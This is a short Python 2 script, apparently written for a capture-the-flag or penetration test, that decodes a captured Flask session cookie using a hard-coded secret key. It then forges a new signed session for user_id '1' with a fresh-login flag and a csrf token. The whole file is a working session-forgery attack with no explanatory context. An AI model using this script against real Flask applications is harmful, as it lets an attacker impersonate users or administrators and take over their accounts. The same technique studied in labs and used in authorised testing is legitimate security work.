#!/usr/bin/env python
from flask.sessions import SecureCookieSessionInterface
from itsdangerous import URLSafeTimedSerializer

class SimpleSecureCookieSessionInterface(SecureCookieSessionInterface):
	# Override method
	# Take secret_key instead of an instance of a Flask app
	def get_signing_serializer(self, secret_key):
		if not secret_key:
			return None
		signer_kwargs = dict(
			key_derivation=self.key_derivation,
			digest_method=self.digest_method
		)
		return URLSafeTimedSerializer(secret_key, salt=self.salt,
		                              serializer=self.serializer,
		                              signer_kwargs=signer_kwargs)

def decodeFlaskCookie(secret_key, cookieValue):
	sscsi = SimpleSecureCookieSessionInterface()
	signingSerializer = sscsi.get_signing_serializer(secret_key)
	return signingSerializer.loads(cookieValue)

# Keep in mind that flask uses unicode strings for the
# dictionary keys
def encodeFlaskCookie(secret_key, cookieDict):
	sscsi = SimpleSecureCookieSessionInterface()
	signingSerializer = sscsi.get_signing_serializer(secret_key)
	return signingSerializer.dumps(cookieDict)

sk = 'a7a8342f9b41fcb062b13dd1167785f8'
sessionDict = {'Hello':'World'}
cookie = ".eJwlj9FqwzAMRX_F-LkMy5YdK1-x91GKLMtNWNaMOH0q_fcZ9iQOulccveytbdwX7Xb-ellzjmF_tHe-q73Yz025q9n2u1kf5twNi4ylOZe1m9-R-bDX9_UyjhzaFzufx1MHrdXOlkurVGpQRJ8IJAJNzCFNkVJJmH2ZtLGjoOI8YEScnBvQBBlDqMhQk3DUGBtDyFNx1JqAcMVEOQk4oATArXLKNRM4dEq1BNQJJA996Ue7nfu3PoYPsRZQVAaILWTJ1AZnctFnZa-esARfefSeXY__J5x9_wHfDVZO.DpGYXQ.suTE0dpRdo54TtRRwsdz_a9gXMs"
decodedDict = decodeFlaskCookie(sk, cookie)
print "[+] decoded cookie: "
print decodedDict


sessionDict = {u'csrf_token': u'9aeb1e4ea115f38c89fb1e890528ea2e294b32da', u'_fresh': True, u'user_id': u'1', u'_id': u'abfd9bd3e442691c5197aa367596b6482b7efa093ec02145447003ecfc4a433d4a1d6ca5e55fa1387b09ffc1cad46986c1019611afda68d891040e9db34e71c8'}
new_cookie = encodeFlaskCookie(sk, sessionDict)
print "\n[+] new_cookie: "
print new_cookie

